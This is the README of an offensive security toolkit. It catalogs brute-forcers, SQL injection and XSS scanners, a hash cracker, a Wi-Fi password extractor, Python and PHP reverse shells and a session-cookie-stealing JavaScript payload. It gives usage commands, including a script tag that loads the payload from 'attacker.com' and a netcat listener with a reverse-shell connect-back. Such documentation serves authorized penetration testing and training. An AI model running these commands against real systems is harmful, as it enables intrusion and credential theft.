# 🛡️ Ethical Exploration

[![License: GPL-3.0](https://img.shields.io/badge/License-GPL--3.0-blue.svg)](LICENSE)
[![Python](https://img.shields.io/badge/Python-3.8+-3776AB.svg?logo=python&logoColor=white)](https://www.python.org/)
[![C#](https://img.shields.io/badge/C%23-.NET-239120.svg?logo=c-sharp&logoColor=white)](https://dotnet.microsoft.com/)
[![Bash](https://img.shields.io/badge/Shell-Bash-4EAA25.svg?logo=gnu-bash&logoColor=white)](https://www.gnu.org/software/bash/)
[![Release](https://img.shields.io/badge/Release-v1.0.0-orange.svg)](https://github.com/sanguirIS/Ethical_Exploration/releases)

> **A multi-language toolkit for ethical hacking, penetration testing, network reconnaissance, vulnerability scanning, and systems automation.**

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Repository Structure](#-repository-structure)
- [Tool Catalog & Usage](#-tool-catalog--usage)
  - [Web Application Security](#1-web-application-security)
  - [Network & Reconnaissance](#2-network--reconnaissance)
  - [Cryptography & Password Auditing](#3-cryptography--password-auditing)
  - [Post-Exploitation & Shells](#4-post-exploitation--shells)
  - [System Utilities & Administration](#5-system-utilities--administration)
- [Installation & Quickstart](#-installation--quickstart)
- [Sample Wordlists](#-sample-wordlists)
- [Ethical & Legal Disclaimer](#-ethical--legal-disclaimer)
- [Contributing](#-contributing)
- [License](#-license)

---

## 🌟 Overview

**Ethical Exploration** provides a suite of standalone, zero-bloat security and automation tools designed for penetration testers, security engineers, system administrators, and cybersecurity students.

Every tool is built with a focus on simplicity, execution speed, error resilience, and standardized command-line interfaces (`--help`).

---

## 📁 Repository Structure

```
Ethical_Exploration/
├── sample_wordlists/             # Bundled testing dictionaries
│   ├── directories.txt           # Common web directories & paths
│   ├── passwords.txt             # Top authentication passwords
│   └── subdomains.txt            # Common DNS host prefixes
├── BruteForceLogin.py            # Multi-threaded HTTP authentication brute-forcer
├── bruteforceweb.py              # Credential stuffing with CSRF token extraction
├── CSRFTester.py                 # CSRF vulnerability tester & HTML PoC generator
├── DirectoryBruteforce.py        # Multi-threaded web path and file discovery
├── Fuzzer.py                     # Web parameter and endpoint fuzzer
├── HashCracker.py                # Multi-algorithm cryptographic hash cracker
├── Locate.cs                     # C# .NET IP geolocation & ASN intelligence lookup
├── MStore.bat                    # Windows Store package installation manager
├── OptimizeServer.bat            # Windows system performance & TCP stack optimizer
├── Program.cs                    # C# Discord API authentication & token inspection
├── ReverseShell.py               # Cross-platform interactive reverse shell client
├── reverseshell.php              # Interactive PHP reverse shell with socket routing
├── SQLInjectionScanner.py        # Error-based, boolean-blind, and auth bypass SQLi scanner
├── SubdomainFinder.py            # Multi-threaded DNS subdomain enumerator
├── Wi-Fi passwords.bat           # Windows Wi-Fi profile and cleartext key audit
├── XSSScanner.py                 # Reflected and DOM-based Cross-Site Scripting scanner
├── openports.bash                # High-performance parallel Bash TCP port scanner
├── portScan.py                   # Multi-threaded Python TCP port scanner & banner grabber
├── stealsessioncookies.js        # Client-side session and storage exfiltration PoC
├── requirements.txt              # Optional Python dependencies
├── CONTRIBUTING.md               # Contribution guidelines & code standards
├── LICENSE                       # GNU General Public License v3.0
└── README.md                     # Project documentation
```

---

## 🛠️ Tool Catalog & Usage

### 1. Web Application Security

#### `BruteForceLogin.py`
Multi-threaded HTTP login brute-forcer supporting URL-encoded forms, GET requests, and JSON payloads with custom success/failure detection.

```bash
# Form-encoded POST login attack
python3 BruteForceLogin.py -u https://example.com/login -U admin -P sample_wordlists/passwords.txt

# JSON API endpoint attack with custom success indicator
python3 BruteForceLogin.py -u https://example.com/api/v1/auth -U admin -P sample_wordlists/passwords.txt --json --success-str "access_token" -t 10
```

#### `bruteforceweb.py`
Advanced web credential-stuffing engine equipped with automated anti-CSRF token extraction, rate-limit delays, and user/password matrix testing.

```bash
# Form brute force with automatic CSRF token parsing
python3 bruteforceweb.py -u http://127.0.0.1:8080/login --username admin -P sample_wordlists/passwords.txt --csrf

# Spray attack testing user list against password list with delay
python3 bruteforceweb.py -u http://target.local/login --user-list users.txt --pass-list passwords.txt -d 0.5
```

#### `CSRFTester.py`
Automated Cross-Site Request Forgery auditor that evaluates anti-CSRF tokens, tests Origin/Referer header enforcement, and generates ready-to-run HTML Proof of Concept (`csrf_poc.html`) forms.

```bash
# Test endpoint and generate HTML PoC
python3 CSRFTester.py -u https://example.com/api/user/email -d '{"email":"attacker@test.com"}' -g -o csrf_poc.html
```

#### `DirectoryBruteforce.py`
High-speed multi-threaded directory and file brute-forcer supporting custom extensions, HTTP redirect tracking, and status code filtering.

```bash
# Basic directory discovery
python3 DirectoryBruteforce.py -u https://example.com -w sample_wordlists/directories.txt

# Extended scan with file extensions and thread tuning
python3 DirectoryBruteforce.py -u http://127.0.0.1:8080 -w sample_wordlists/directories.txt -e php,html,txt,json -t 20 -c 200,301,302,401,403
```

#### `Fuzzer.py`
Flexible fuzzing utility that injects payload lists into URLs, parameters, headers, or POST bodies wherever the `FUZZ` placeholder is defined.

```bash
# Query parameter fuzzing
python3 Fuzzer.py -u "https://example.com/item?id=FUZZ" -w sample_wordlists/directories.txt

# POST body fuzzing with status code filter
python3 Fuzzer.py -u "https://example.com/search" -m POST -d "q=FUZZ" -c 200,302
```

#### `SQLInjectionScanner.py`
Comprehensive SQL injection auditor detecting error signatures (MySQL, PostgreSQL, MSSQL, Oracle, SQLite), authentication bypass vectors, and boolean anomalies.

```bash
# Scan POST login parameter for SQLi
python3 SQLInjectionScanner.py -u https://example.com/login -p username -m POST

# Scan GET query parameter
python3 SQLInjectionScanner.py -u https://example.com/products -p category -m GET
```

#### `XSSScanner.py`
Cross-Site Scripting (XSS) scanner evaluating script tag injection, SVG/Image event handlers, attribute escapes, and reflection sanitization status.

```bash
# Scan search query parameter
python3 XSSScanner.py -u https://example.com/search -p query -m GET

# Scan form comment submission
python3 XSSScanner.py -u https://example.com/contact -p message -m POST
```

#### `stealsessioncookies.js`
Modular JavaScript payload for demonstrating session hijack risks during penetration tests. Collects `document.cookie`, `localStorage`, and `sessionStorage` and transmits them via `navigator.sendBeacon`, `fetch`, or image beacons.

```html
<!-- Example PoC Injection -->
<script src="http://attacker.com/stealsessioncookies.js"></script>
```

---

### 2. Network & Reconnaissance

#### `portScan.py`
Multi-threaded TCP port scanner featuring socket connect probes, standard service name mapping, and banner grabbing.

```bash
# Scan top standard ports
python3 portScan.py -t 127.0.0.1 -p top

# Scan specific port range with 100 threads
python3 portScan.py -t 192.168.1.1 -p 1-1024 --threads 100
```

#### `openports.bash`
High-efficiency, non-blocking parallel port scanner written in pure Bash utilizing `/dev/tcp` socket redirection.

```bash
# Scan target across port range 1 to 1024
./openports.bash 192.168.1.1 1 1024
```

#### `SubdomainFinder.py`
Fast multi-threaded subdomain discovery engine using DNS resolution and HTTP/HTTPS service banner probing with wildcard DNS filtering.

```bash
# Enumerate subdomains with HTTP probing
python3 SubdomainFinder.py -d example.com -w sample_wordlists/subdomains.txt -t 20 -o found_subdomains.txt
```

#### `Locate.cs`
.NET C# console application that queries external geolocation and ASN registry APIs (`ipinfo.io`) to provide city, region, ISP/ASN, coordinates, and Google Maps mapping for any IP address.

```bash
# Compile and run with .NET SDK
dotnet run -- 8.8.8.8
```

---

### 3. Cryptography & Password Auditing

#### `HashCracker.py`
Multi-algorithm hash identification and dictionary cracking engine supporting MD5, SHA-1, SHA-224, SHA-256, SHA-384, SHA-512, and NTLM with salt prefix/suffix support and hash-rate benchmarking.

```bash
# Auto-detect hash type and crack
python3 HashCracker.py -H 5f4dcc3b5aa765d61d8327deb882cf99 -w sample_wordlists/passwords.txt

# Crack SHA-256 hash with salt
python3 HashCracker.py -H 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 -w sample_wordlists/passwords.txt -a sha256
```

#### `Wi-Fi passwords.bat`
Windows batch utility that automatically requests administrative elevation and extracts all stored Wi-Fi SSIDs and their cleartext passwords, exporting results to `wifi_passwords_export.txt`.

```bat
:: Run as Administrator in Command Prompt
"Wi-Fi passwords.bat"
```

---

### 4. Post-Exploitation & Shells

#### `ReverseShell.py`
Interactive, bidirectional TCP reverse shell client supporting directory changes (`cd`), environment variable persistence, error stream capturing, and cross-platform compatibility (Linux, macOS, Windows).

```bash
# Start listener on host machine:
# nc -lvnp 4444

# Connect back from target:
python3 ReverseShell.py -i 192.168.1.50 -p 4444
```

#### `reverseshell.php`
Interactive PHP reverse shell with non-blocking stream multiplexing connecting back to an operator's listener via CLI or web execution.

```bash
# CLI invocation
php reverseshell.php 192.168.1.50 4444
```

---

### 5. System Utilities & Administration

#### `OptimizeServer.bat`
Windows server performance script that safely purges temporary directories, flushes DNS caches, optimizes TCP window auto-tuning, and trims process memory working sets.

```bat
:: Execute with Administrator privileges
OptimizeServer.bat
```

#### `MStore.bat`
Windows utility to verify Microsoft Store AppX package integrity and automate application installation via store protocol handlers.

```bat
MStore.bat 9WZDNCRFJBMP
```

#### `Program.cs`
.NET C# Discord API authentication client with masked console password entry, token retrieval, and MFA/CAPTCHA handling.

```bash
dotnet run
```

---

## 🚀 Installation & Quickstart

### 1. Clone the Repository
```bash
git clone https://github.com/sanguirIS/Ethical_Exploration.git
cd Ethical_Exploration
```

### 2. Install Python Dependencies (Optional)
The Python tools are engineered to work out of the box using the Python standard library (`urllib.request`, `socket`, `hashlib`, `concurrent.futures`). Installing `requests` enables enhanced connection pooling:
```bash
pip install -r requirements.txt
```

---

## 📚 Sample Wordlists

The `sample_wordlists/` directory contains curated baseline wordlists for immediate testing:
- `sample_wordlists/passwords.txt` — Common authentication passwords.
- `sample_wordlists/directories.txt` — Standard web directories and sensitive files.
- `sample_wordlists/subdomains.txt` — High-probability DNS hostnames.

---

## ⚖️ Ethical & Legal Disclaimer

> **IMPORTANT**: This repository and its tools are provided exclusively for **authorized security testing, educational research, and defensive auditing**.
>
> Testing systems or networks without explicit, prior written permission from the system owner is illegal and constitutes a violation of local and international computer crime laws (e.g., US Computer Fraud and Abuse Act, UK Computer Misuse Act). The authors and maintainers assume **no liability** for any misuse or damage caused by these programs.

---

## 🤝 Contributing

Contributions, bug reports, and enhancements are welcome! Please review [CONTRIBUTING.md](CONTRIBUTING.md) for contribution guidelines, coding standards, and our ethical code of conduct.

---

## 📄 License

This project is licensed under the **GNU General Public License v3.0 (GPL-3.0)**. See the [LICENSE](LICENSE) file for complete details.
